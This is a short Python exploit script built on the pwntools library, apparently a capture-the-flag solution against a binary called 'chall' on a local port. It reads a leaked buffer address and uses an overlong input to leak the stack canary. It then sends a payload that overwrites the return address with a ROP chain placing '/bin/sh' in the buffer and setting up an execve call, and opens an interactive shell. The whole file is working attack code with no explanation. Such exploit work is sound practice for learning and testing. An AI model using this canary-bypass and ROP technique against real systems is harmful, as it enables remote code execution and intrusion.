from pwn import *
#p=process("./chall")
p=remote("127.0.0.1",8000)
elf=ELF("./chall")
#libc=ELF("/lib/x86_64-linux-gnu/./libc.so.6")
#gdb.attach(p)

p.recvuntil(b"leak: ")
buffer_leak=int(p.recvuntil(b"\n")[:-1],16)
print(hex(buffer_leak))

p.sendline("aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaa")
p.recvuntil(b"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaa")
canary=u64(p.recv(8).ljust(8,b"\x00"))-0x0a
print(hex(canary))
payload=b"/bin/sh\x00"
payload+=b"A"*(104-len(payload))+p64(canary)+p64(0x0)
payload+=p64(0x0000000000401167)+p64(0x3b)
payload+=p64(0x000000000040115e)+p64(buffer_leak)
payload+=p64(0x000000000040115a)+p64(0x0)
payload+=p64(0x000000000040115c)+p64(0x0)
payload+=p64(0x0000000000401169)
p.sendline(payload)


p.interactive()
